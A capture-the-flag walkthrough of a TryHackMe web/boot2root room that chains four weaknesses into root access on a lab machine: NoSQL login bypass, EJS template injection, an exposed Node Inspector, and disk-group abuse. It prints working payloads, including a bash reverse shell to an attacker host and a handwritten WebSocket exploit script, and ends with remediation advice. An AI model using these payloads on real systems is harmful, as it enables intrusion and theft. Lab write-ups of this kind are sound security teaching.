# TryHackMe — Hacker Holidays 2026
## Day 7: [Do Not Disturb](https://tryhackme.com/room/hh-donotdisturb-84a45644)

**Platform:** [TryHackMe](https://tryhackme.com)  
**Category:** Web / Boot2Root  
**Difficulty:** Medium  
**Status:** Complete — both flags recovered

---

## Description

The target is a Byte Lotus web platform. The story and hints suggest session abuse and an intruder already inside. The objective is to gain initial access, escalate privileges, and recover both flags.

## Attack chain overview

Before diving into commands, here is the "map" of the whole attack so it's easier to follow each step:

1. **Recon** → find open ports and the web app.
2. **NoSQL Injection** → bypass the login form without knowing any password.
3. **SSTI (Server-Side Template Injection)** → abuse a "template preview" feature meant for staff to run our own code on the server.
4. **RCE as `poolside`** → get a real interactive shell, read the user flag.
5. **Privilege escalation recon** → look for a way from `poolside` to a more privileged account.
6. **Node.js Inspector abuse** → find a debugging port left open on `localhost`, belonging to a *different* service account, and use it to run commands as that user.
7. **Linux group misconfiguration** → discover that service account belongs to the `disk` group, which grants raw access to the physical disk device.
8. **Raw disk read with `debugfs`** → read `/root/root.txt` directly from the disk image, completely bypassing normal Linux file permissions.

Each of these steps is a full vulnerability on its own — chaining four of them together is what makes this room interesting.

---

## Step 1 — Initial reconnaissance

```bash
nmap -sV -p- --min-rate 5000 -oN nmap <target_ip>
```

**Flag/options used:**
- `-sV` → service/version detection
- `-p-` → scan all 65535 TCP ports
- `--min-rate 5000` → increase packet send rate (faster scan)
- `-oN nmap` → save normal output to file `nmap`

**Output (relevant):**

```text
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  Node.js (Express middleware)
```

Then:

```bash
curl -i http://<target_ip>/
```

**Flag/options used:**
- `-i` → include HTTP response headers

**Result:** Express login page with form `POST /login`.

---

## Step 2 — Route enumeration

```bash
ffuf -u http://<target_ip>/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt \
  -mc 200,301,302,403
```

**Flag/options used:**
- `-u` → target URL, `FUZZ` is replaced with each wordlist entry
- `-w` → wordlist path
- `-mc` → show only selected HTTP status codes

**Output (relevant):**

```text
/        [200]
/logout  [302]
/staff   [403]
```

`/staff` exists but is access-controlled.

---

## Step 3 — Login bypass via NoSQL injection

### 3.1 Find a valid username from the login page source

Before trying any injection, view the page source of the login form itself:

```bash
curl -s http://<target_ip>/login
```

**Output (relevant):**

```html
<form method="post" action="/login">
  <label>Staff / Guest ID</label>
  <input name="username" autocomplete="off" placeholder="attendant">
  <label>Passphrase</label>
  <input name="password" type="password" autocomplete="off">
  <button type="submit">Sign in</button>
</form>
```

**Explanation:** the `<input name="username" ... placeholder="attendant">` line is the key detail. A **placeholder** is just greyed-out example text shown in an empty input box before the user types anything — it's meant as a UI hint, but developers often carelessly use a *real* username as that hint text instead of a generic example like `"username"`. Reading the raw HTML source (not just what's rendered visually) reveals it: `attendant` is very likely a genuine account name on this system. This is a classic example of **information disclosure through client-side code** — anything sent to the browser, including HTML comments, placeholders, JS variables, or hidden fields, must be treated as fully public and readable by an attacker.

### 3.2 Perform the injection

Normal credentials fail (`Invalid credentials`).  
Because backend is Node.js + NeDB-style querying, test JSON operator injection:

```bash
curl -i -s -X POST http://<target_ip>/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

**Flag/options used:**
- `-i` → include headers
- `-s` → silent mode
- `-X POST` → explicit POST
- `-H` → custom request header
- `-d` → request body data

**Output (relevant):**

```text
Set-Cookie: connect.sid=...
{"ok":true,"role":"guest"}
```

**Explanation — why this can return `guest` instead of `staff`:** the server logic behind this is roughly:

```js
user = await db.findOneAsync({ username, password });
```

`{"$ne": null}` on *both* fields tells the database "match any document where `username` is not null AND `password` is not null" — that is, **any account in the collection**, not specifically the staff account. `findOneAsync` returns whichever matching document the database happens to hand back first, which depends on internal storage/insertion order and is **not guaranteed to be the same account every time the room is deployed**. On this deployment a `guest` account happened to be returned first, so the bypass "worked" (authentication was still defeated) but landed us in the wrong, low-privilege session.

**Fix — pin the username to the real account, keep only the password bypassed:**

```bash
curl -i -s -X POST http://<target_ip>/login \
  -H "Content-Type: application/json" \
  -d '{"username": "attendant", "password": {"$ne": null}}'
```

**Flag/options used:** same as above; the only change is that `username` is now the literal string `"attendant"` (the real staff account name for this room instance) instead of an operator object. This forces NeDB to match `{ username: "attendant" }` exactly, while `password: {"$ne": null}` still bypasses the password check (any non-null password value satisfies it, and we don't know the real password).

**Output (relevant):**

```text
Set-Cookie: connect.sid=...
{"ok":true,"role":"staff"}
```

Bypass succeeded and returned a valid **staff** session cookie for the `attendant` account.

> **Lesson learned:** when a `$ne`-style bypass returns the *wrong* role, it usually means the query matched an unintended account first. The robust fix is to always pin every field you already know (like `username`) to its real, literal value, and leave the operator injection (`$ne`, `$gt`, etc.) only on the field you're actually trying to bypass (like `password`).

---

## Step 4 — Access staff panel with hijacked session

```bash
curl -i -s -b "connect.sid=<session_cookie>" http://<target_ip>/staff
```

**Flag/options used:**
- `-b` → send cookie in request

**Result:** Staff dashboard exposes an EJS template preview form:
- endpoint: `POST /staff/preview`
- hint: use `<%= guest %>` in template

This indicates possible SSTI (Server-Side Template Injection).

---

## Step 5 — Confirm SSTI to RCE

```bash
curl -i -s -X POST \
  -b "connect.sid=<session_cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('id').toString() %>" \
  http://<target_ip>/staff/preview
```

**Flag/options used:**
- `--data-urlencode` → URL-encode form value safely (handles special chars)

**Output (inside preview block):**

```text
uid=996(poolside) gid=996(poolside) groups=996(poolside)
```

RCE confirmed as user `poolside`.

---

## Step 6 — Read user flag through SSTI RCE

```bash
curl -i -s -X POST \
  -b "connect.sid=<session_cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('cat /home/poolside/user.txt').toString() %>" \
  http://<target_ip>/staff/preview
```

**Output (preview):**

```text
THM{[REDACTED]}
```

User flag recovered.

---

## Step 7 — Get reverse shell and stabilize it

Start listener on attacker host:

```bash
nc -lvnp 4444
```

**Flag/options used:**
- `-l` → listen mode
- `-v` → verbose output
- `-n` → no DNS resolution
- `-p 4444` → listen on port 4444

Trigger reverse shell via SSTI:

```bash
curl -s -X POST \
  -b "connect.sid=<session_cookie>" \
  --data-urlencode "template=<%= global.process.mainModule.require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/<attack_ip>/4444 0>&1\"').toString() %>" \
  http://<target_ip>/staff/preview
```

Stabilization sequence used:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

Then press `Ctrl+Z`, and in local terminal:

```bash
stty raw -echo; fg
```

Shell context:

```text
poolside@tryhackme-2404:/opt/poolside$
```

---

## Step 8 — Privilege escalation reconnaissance

### 8.1 Check sudo rights

```bash
sudo -l
```

**Output:**

```text
[sudo] password for poolside:
sudo: a password is required
```

**Explanation:** `poolside` is not configured for passwordless sudo and we do not know the password, so there is no direct privilege escalation path via sudo.

### 8.2 Enumerate local users

Before checking any other user's home directory, we first need to know **which other users even exist** on this box. List every local account:

```bash
cat /etc/passwd
```

**Output (relevant):**

```text
poolside:x:1000:1000::/home/poolside:/bin/bash
pipelinesvc:x:995:995::/home/pipelinesvc:/usr/sbin/nologin
```

**Explanation:** `/etc/passwd` is world-readable on every standard Linux system and lists **every local account**, one per line, in the format `username:x:UID:GID:comment:home_dir:shell`. Scanning it (or filtering with `grep -v nologin` / `grep -v '/bin/false'` to spot "real" interactive accounts, or just eyeballing it on a small list like this one) is one of the very first things to do during privilege-escalation recon — it tells us **who else exists on the machine** before we start guessing directory names. Here we spot a second account, `pipelinesvc` (UID 995, a typical "system/service account" UID range below 1000), with home directory `/home/pipelinesvc` and shell `/usr/sbin/nologin`. That's the lead that justifies checking its home directory next.

### 8.3 Check access to other user home directories

```bash
ls -la /home/pipelinesvc/
```

**Output:**

```text
ls: cannot open directory '/home/pipelinesvc/': Permission denied
```

**Explanation:** We cannot directly read `pipelinesvc` home content. This confirms normal file permissions and forces us to pivot through services/processes instead of direct file theft.

### 8.4 Identify interesting application/service folders

```bash
ls -la /opt/
```

**Output (relevant):**

```text
drwxr-xr-x 3 root root 4096 Jun 16 09:28 pipelinesvc
drwxr-xr-x 3 root root 4096 Jun 16 09:28 poolside
```

**Explanation:** There are two app trees under `/opt`, one for our current foothold (`poolside`) and one for `pipelinesvc`. This strongly suggests a service-to-service pivot path.

### 8.5 Check common local privesc vectors (SUID)

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Output (excerpt):**

```text
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/bin/mount
...
```

**Explanation:** Only standard SUID binaries appear; no custom or unusual SUID executable suitable for a straightforward exploit.

### 8.6 Check cron-based escalation opportunities

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

**Output (relevant):**

```text
17 * * * * root cd / && run-parts --report /etc/cron.hourly
...
```

```text
-rw-r--r-- 1 root root ... e2scrub_all
-rw-r--r-- 1 root root ... sysstat
```

**Explanation:** No custom writable root cron jobs were found. Scheduled tasks are default system entries with root-owned, non-writable files.

### 8.7 Check Linux capabilities

```bash
getcap -r / 2>/dev/null
```

**Output (excerpt):**

```text
/usr/bin/ping cap_net_raw=ep
/usr/bin/mtr-packet cap_net_raw=ep
...
```

**Explanation:** Capabilities are typical networking capabilities; no obvious high-impact capability (e.g. custom binary with dangerous caps) for escalation.

### 8.8 Inspect application source for auth/session clues

```bash
cat /opt/poolside/app.js
```

**Output (relevant excerpts):**

```javascript
user = await db.findOneAsync({ username, password });
```

```javascript
rendered = ejs.render(template, { guest: req.session.user.username, hotel: 'Byte Lotus' });
```

**Explanation:** This confirms the vulnerabilities used for initial access:
1. NoSQL operator injection in login query.
2. SSTI due to unsafely rendering user-supplied EJS templates.

### 8.9 Confirm second user and shell policy

```bash
cat /etc/passwd | grep pipeline
```

**Output:**

```text
pipelinesvc:x:995:995::/home/pipelinesvc:/usr/sbin/nologin
```

**Explanation:** `pipelinesvc` is a service account with `nologin`, so direct interactive login is intentionally blocked.

### 8.10 Discover the service that belongs to pipelinesvc

```bash
find /etc/systemd/system/ -name "*.service" 2>/dev/null | xargs grep -l pipeline 2>/dev/null
```

**Output:**

```text
/etc/systemd/system/multi-user.target.wants/lotus-telemetry.service
/etc/systemd/system/lotus-telemetry.service
```

**Explanation:** This is the command that exposed the target service. It finds systemd unit files, then filters them for the keyword `pipeline`.

### 8.11 Read the service configuration

```bash
cat /etc/systemd/system/lotus-telemetry.service
```

**Output (relevant):**

```text
[Service]
User=pipelinesvc
Group=pipelinesvc
WorkingDirectory=/opt/pipelinesvc/telemetry
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 processor.js
Restart=always
```

**Explanation:** Critical finding: Node starts with `--inspect` bound to localhost on `9229`. That exposes the DevTools debugger interface, often enough to execute code in the target process context.

### 8.12 Validate Node inspector exposure

```bash
ss -ltnp | grep 9229
```

**Flag/options used:**
- `-l` → show only listening sockets
- `-t` → TCP sockets only
- `-n` → show numeric addresses/ports instead of resolving names (faster, no DNS)
- `-p` → show the process (PID/name) that owns the socket

**Output:**

```text
LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

**Explanation:** Something is listening on TCP port `9229`, but only on `127.0.0.1` (localhost). That means it's not reachable from outside the machine — but we are *already inside* the machine as `poolside`, so we can reach it locally.

```bash
curl -s http://127.0.0.1:9229/json/list
```

**Output:**

```json
[ {
  "description": "node.js instance",
  "id": "8a1f128a-87a3-40db-b8d8-098694f61b3c",
  "title": "processor.js",
  "type": "node",
  "url": "file:///opt/pipelinesvc/telemetry/processor.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/8a1f128a-87a3-40db-b8d8-098694f61b3c"
} ]
```

**Explanation:** Port `9229` is the **default port for the Node.js Inspector** (the built-in debugger protocol Node uses when started with the `--inspect` flag, the same protocol Chrome DevTools uses to debug JavaScript). This JSON confirms:
- the debugged script is `processor.js` — exactly the file we already read in `/opt/pipelinesvc/telemetry/processor.js`
- there's a `webSocketDebuggerUrl` — this is the address we must connect to (over a **WebSocket**, not plain HTTP) to send debugging commands
- because the service file (`lotus-telemetry.service`) showed `User=pipelinesvc`, whoever controls this debugger session can run code **as `pipelinesvc`**, not as `poolside`

This is a well-known real-world vulnerability class: **exposed Node.js Inspector/Debugger = Remote Code Execution**, because the debug protocol includes a method called `Runtime.evaluate` that literally means "run this JavaScript for me".

---

## Step 9 — Pivot to `pipelinesvc` via the Node Inspector (WebSocket)

### 9.1 Why we can't just use `curl` here

The Node Inspector protocol is **not** a normal REST API — `/json/list` (which we already queried) is the only plain-HTTP endpoint. Everything else, including running code, happens over a **WebSocket** connection using JSON messages (this is the "Chrome DevTools Protocol").

`curl` does not speak WebSocket, and this lab machine doesn't have tools like `wscat` or `websocat` pre-installed. So we write a **small Python script using only the standard library** (`socket`, `ssl`, `base64`) to:
1. Perform the WebSocket handshake by hand (it's just a special HTTP request).
2. Encode/decode WebSocket frames by hand (a WebSocket frame is a simple binary format).
3. Send a `Runtime.evaluate` JSON-RPC message asking Node to run a shell command for us.
4. Read the response back and print the result.

### 9.2 The exploitation script

```bash
cat > /tmp/ws_eval.py << 'PY'
import base64, os, socket, ssl, json, sys, urllib.parse

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <ws_url> <cmd>")
    sys.exit(1)

ws_url = sys.argv[1]
cmd = sys.argv[2]
u = urllib.parse.urlparse(ws_url)

host = u.hostname
port = u.port or (443 if u.scheme == "wss" else 80)
path = u.path or "/"

# Step A: open a plain TCP socket to the debugger
s = socket.create_connection((host, port))
if u.scheme == "wss":
    s = ssl.create_default_context().wrap_socket(s, server_hostname=host)

# Step B: perform the WebSocket handshake (a special HTTP Upgrade request)
key = base64.b64encode(os.urandom(16)).decode()
req = (
    f"GET {path} HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Upgrade: websocket\r\n"
    "Connection: Upgrade\r\n"
    f"Sec-WebSocket-Key: {key}\r\n"
    "Sec-WebSocket-Version: 13\r\n\r\n"
)
s.sendall(req.encode())
resp = s.recv(4096)
if b"101 Switching Protocols" not in resp:
    print("Handshake failed")
    sys.exit(1)

# Step C: helper functions to send/receive WebSocket text frames
def ws_send_text(sock, text):
    payload = text.encode()
    b1 = 0x81  # FIN + text frame opcode
    mask_bit = 0x80  # clients MUST mask frames sent to the server
    ln = len(payload)
    if ln < 126:
        header = bytes([b1, mask_bit | ln])
    elif ln < 65536:
        header = bytes([b1, mask_bit | 126]) + ln.to_bytes(2, "big")
    else:
        header = bytes([b1, mask_bit | 127]) + ln.to_bytes(8, "big")
    mask = os.urandom(4)
    masked = bytes(payload[i] ^ mask[i % 4] for i in range(ln))
    sock.sendall(header + mask + masked)

def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return data
        data += chunk
    return data

def ws_recv_text(sock):
    h = recv_exact(sock, 2)
    if len(h) < 2:
        return None
    b1, b2 = h[0], h[1]
    opcode = b1 & 0x0F
    masked = (b2 >> 7) & 1
    ln = b2 & 0x7F
    if ln == 126:
        ln = int.from_bytes(recv_exact(sock, 2), "big")
    elif ln == 127:
        ln = int.from_bytes(recv_exact(sock, 8), "big")
    mask = recv_exact(sock, 4) if masked else None
    data = recv_exact(sock, ln)
    if masked:
        data = bytes(data[i] ^ mask[i % 4] for i in range(len(data)))
    if opcode == 1:      # text frame
        return data.decode(errors="ignore")
    if opcode == 8:       # close frame
        return "__CLOSE__"
    return ""

# Step D: send our two protocol messages
# 1) Runtime.enable — required before Runtime.evaluate will work
ws_send_text(s, json.dumps({"id":1,"method":"Runtime.enable"}))
# 2) Runtime.evaluate — ask Node to literally run this JS expression
expr = f"process.mainModule.require('child_process').execSync({cmd!r}).toString()"
ws_send_text(s, json.dumps({"id":2,"method":"Runtime.evaluate","params":{"expression":expr}}))

# Step E: keep reading messages until we get the response to OUR request (id: 2)
s.settimeout(10)
while True:
    try:
        msg = ws_recv_text(s)
    except socket.timeout:
        print("[!] Timeout waiting for id:2 response", file=sys.stderr)
        break
    if msg == "__CLOSE__" or msg is None:
        break
    if not msg:
        continue
    try:
        j = json.loads(msg)
    except Exception:
        continue
    if j.get("id") == 2:
        try:
            print(j["result"]["result"]["value"])
        except Exception:
            print(j)
        break
PY
```

**Explanation of the tricky parts (for beginners):**

- **`process.mainModule.require(...)` instead of just `require(...)`:** when the Inspector runs our expression, it evaluates it in the **global scope** of the debugged program, not inside the `processor.js` module itself. In global scope, Node does *not* automatically provide the `require()` function (that's a per-module thing). `process.mainModule` is a reference to the entry-point module, and modules always carry their own `require`, so `process.mainModule.require('child_process')` reaches it indirectly. This is exactly the same trick we used earlier during the SSTI step (`global.process.mainModule.require(...)`).
- **Masking (`mask_bit`, XOR loop):** the WebSocket protocol requires that any frame sent *from a client to a server* must be "masked" (XORed) with a random 4-byte key, for historical security reasons related to proxy cache poisoning. Servers never mask their replies, which is why `ws_recv_text` only unmasks when the `masked` bit is set.

### 9.3 Successful RCE as `pipelinesvc`

Extract the WebSocket debugger URL and run the script against it:

```bash
WS_URL=$(curl -s http://127.0.0.1:9229/json/list | sed -n 's/.*"webSocketDebuggerUrl": "\(ws:[^"]*\)".*/\1/p')
python3 /tmp/ws_eval.py "$WS_URL" "id"
```

**Flag/options used:**
- `sed -n` → suppress automatic printing; only print lines that explicitly match `p`
- `s/pattern/replacement/p` → substitute and print only the captured group (the WebSocket URL)

**Output:**

```text
uid=995(pipelinesvc) gid=995(pipelinesvc) groups=995(pipelinesvc),6(disk)
```

**Explanation:** We are now executing arbitrary shell commands as **`pipelinesvc`** — a different, more isolated service account than `poolside`. Notice something very important in the group list: **`6(disk)`**. This is the next vulnerability.

---

## Step 10 — Abusing membership in the `disk` group

### 10.1 Why the `disk` group matters

On Linux, the `disk` group traditionally grants read/write access to raw block device files under `/dev/` (e.g. `/dev/sda`, `/dev/nvme0n1`). These files represent the **entire physical disk**, byte for byte — not the filesystem as seen through normal file paths. Being in this group is almost equivalent to root when it comes to reading data, because:
- Normal Linux file permissions (`rwx` on `/root/root.txt`) only apply when you access the file **through the filesystem** (via `open()`, `cat`, etc.).
- If instead you read the **raw disk image** directly, you can extract *any* file's content by parsing the filesystem structure yourself — permissions checks never happen at that lower level.

### 10.2 Find the disk devices

```bash
python3 /tmp/ws_eval.py "$WS_URL" "ls -la /dev/ | grep -E 'vd|nvme|xvd'"
```

**Output:**

```text
crw------- 1 root root  241,   0 Aug  3 12:38 nvme0
brw-rw---- 1 root disk  259,   0 Aug  3 12:38 nvme0n1
brw-rw---- 1 root disk  259,   1 Aug  3 12:38 nvme0n1p1
crw------- 1 root root  241,   1 Aug  3 12:38 nvme1
brw-rw---- 1 root disk  259,   2 Aug  3 12:38 nvme1n1
```

**Explanation:** This is a cloud VM using NVMe storage instead of traditional SATA disks (`/dev/sda`), which is why our first guess (`/dev/sd*`) returned nothing. The important line is:

```text
brw-rw---- 1 root disk 259, 1 ... nvme0n1p1
```

- `b` → block device (a raw disk/partition, not a regular file)
- `rw-rw----` → **owner (root) can read/write, group (disk) can read/write**, others have no access
- `nvme0n1p1` → the first partition (`p1`) of the first NVMe disk (`nvme0n1`) — almost certainly the root filesystem partition

Because `pipelinesvc` belongs to the `disk` group, it satisfies the *group* permission bits and can read this device directly.

### 10.3 Find a tool capable of reading files from a raw partition

```bash
python3 /tmp/ws_eval.py "$WS_URL" "which debugfs"
```

**Output:**

```text
/usr/sbin/debugfs
```

**Explanation:** `debugfs` is a standard Linux administration tool (part of `e2fsprogs`) for interactively inspecting and repairing `ext2/ext3/ext4` filesystems. It has a `cat` sub-command that reads a file's content **directly from the filesystem structures on disk** — it doesn't go through the kernel's normal permission-checking file-open path. As long as you can read the underlying block device, `debugfs` can read *any* file on it, including files owned by `root` with `600` permissions.

---

## Step 11 — Reading the root flag with `debugfs`

```bash
python3 /tmp/ws_eval.py "$WS_URL" "debugfs -R 'cat /root/root.txt' /dev/nvme0n1p1 2>&1"
```

**Flag/options used:**
- `-R '<command>'` → run a single `debugfs` command non-interactively and exit (instead of dropping into its interactive shell)
- `'cat /root/root.txt'` → the internal `debugfs` command to print a file's content by path, resolved from the filesystem's own inode structures
- `/dev/nvme0n1p1` → the raw partition to read from (must contain the root filesystem for `/root/root.txt` to exist on it)
- `2>&1` → redirect stderr into stdout so we can see `debugfs`'s banner/errors too, not just its normal output

**Output:**

```text
debugfs 1.47.0 (5-Feb-2023)
THM{[REDACTED]}
```

**Explanation:** `debugfs` opened the raw partition, walked its ext4 directory structure to resolve `/root/root.txt` to an inode, and printed the inode's data — completely bypassing the normal Unix permission check that would otherwise block a non-root user from reading a root-owned file. **Root flag recovered.**

---

## Root Cause

Four independent vulnerabilities were chained together:

1. **NoSQL Injection in login** (CWE-943)  
   User input (`username`, `password`) is passed directly into a NeDB query object without sanitisation. Sending `{"$ne": null}` instead of a string exploits MongoDB/NeDB query operators to match "any non-null value", bypassing authentication entirely.

2. **SSTI — Server-Side Template Injection** (CWE-1336)  
   The `/staff/preview` feature renders a user-supplied string directly with `ejs.render(template, ...)`. EJS templates can contain arbitrary JavaScript (`<%= ... %>`), so an attacker-controlled template is equivalent to attacker-controlled server-side code execution.

3. **Exposed Node.js Inspector/Debugger** (CWE-668 — information/functionality exposed to unauthorized actors)  
   The `lotus-telemetry.service` unit starts Node with `--inspect=127.0.0.1:9229`. While bound to localhost (not internet-facing), *any* local user who can reach `127.0.0.1` can connect to the debugger and execute arbitrary code as the service's user (`pipelinesvc`), because the Inspector protocol has no authentication of its own.

4. **Excessive group membership — `disk` group** (CWE-732 — incorrect permission assignment)  
   `pipelinesvc` should have no reason to belong to the `disk` group. This membership grants raw read/write access to the underlying disk device, allowing tools like `debugfs` to bypass all filesystem-level permission checks and read any file, including root-owned secrets.

### Remediation

| Vulnerability | Fix |
| --- | --- |
| NoSQL injection | Validate/sanitise input types before querying (reject objects where strings are expected); use parameterised/typed query builders |
| SSTI | Never render user-controlled input as a template; use a logic-less template engine or a sandboxed renderer; separate "data" from "template" |
| Exposed Node Inspector | Never enable `--inspect` in production; if required for debugging, bind only to a Unix socket accessible solely by the debugging user, and disable it outside active debugging sessions |
| Excessive `disk` group membership | Apply least privilege: service accounts should never be added to `disk`, `sudo`, or other high-privilege groups unless absolutely required |

---

## Result

Challenge solved by:
1. bypassing authentication with a **NoSQL injection** payload to obtain a valid staff session,
2. exploiting **SSTI** in the staff template-preview feature to gain RCE as `poolside`,
3. reading the **user flag** through that RCE,
4. establishing and stabilising a **reverse shell**,
5. discovering an internal **Node.js Inspector** left open on `127.0.0.1:9229` for the `pipelinesvc` service,
6. writing a small **WebSocket client from scratch** in Python to speak the Chrome DevTools Protocol and achieve RCE as `pipelinesvc`,
7. noticing `pipelinesvc`'s membership in the **`disk`** group,
8. using **`debugfs`** to read `/root/root.txt` directly from the raw disk partition, bypassing normal file permissions entirely.

